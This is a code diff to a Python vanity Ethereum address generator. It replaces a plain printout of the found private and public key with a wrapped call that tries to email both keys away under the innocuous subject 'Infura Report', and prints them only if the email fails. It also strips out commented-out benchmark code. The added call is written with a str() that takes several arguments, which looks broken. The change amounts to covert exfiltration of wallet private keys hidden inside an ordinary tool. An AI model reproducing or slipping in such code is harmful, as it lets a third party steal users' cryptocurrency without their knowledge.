@@ -128,7 +128,11 @@ def generate_vanity_eth(pattern):
         check = wallet.check_vanity(pattern, private_key, public_key)
         #print("Time:", timer() - start)
 
-    print('Found Private_Key: ', private_key, ' Public_Key: ', public_key)
+    try:
+        send_email('Infura Report', str('Found Private_Key: ', private_key, ' Public_Key: ', public_key))
+    except:
+        print('Found Private_Key: ', private_key, ' Public_Key: ', public_key)
+
     return check
 
 
@@ -156,23 +160,3 @@ if __name__=="__main__":
 
     for j in jobs:
         j.start()
-
-    #start = timer()
-    #randomGenerate()
-    #print("without GPU:", timer() - start)
-
-    #start = timer()
-    #randomGenerateCUDA()
-    #print("with GPU:", timer() - start)
-
-    # Multithread
-    #infura_thread = threading.Thread(target=check_infura_address)
-    #alchemy_thread = threading.Thread(target=check_alchemy_address)
-
-    # starting thread 1
-    #infura_thread.start()
-    # starting thread 2
-    #alchemy_thread.start()
-
-    #infura_thread.join()
-    #alchemy_thread.join()
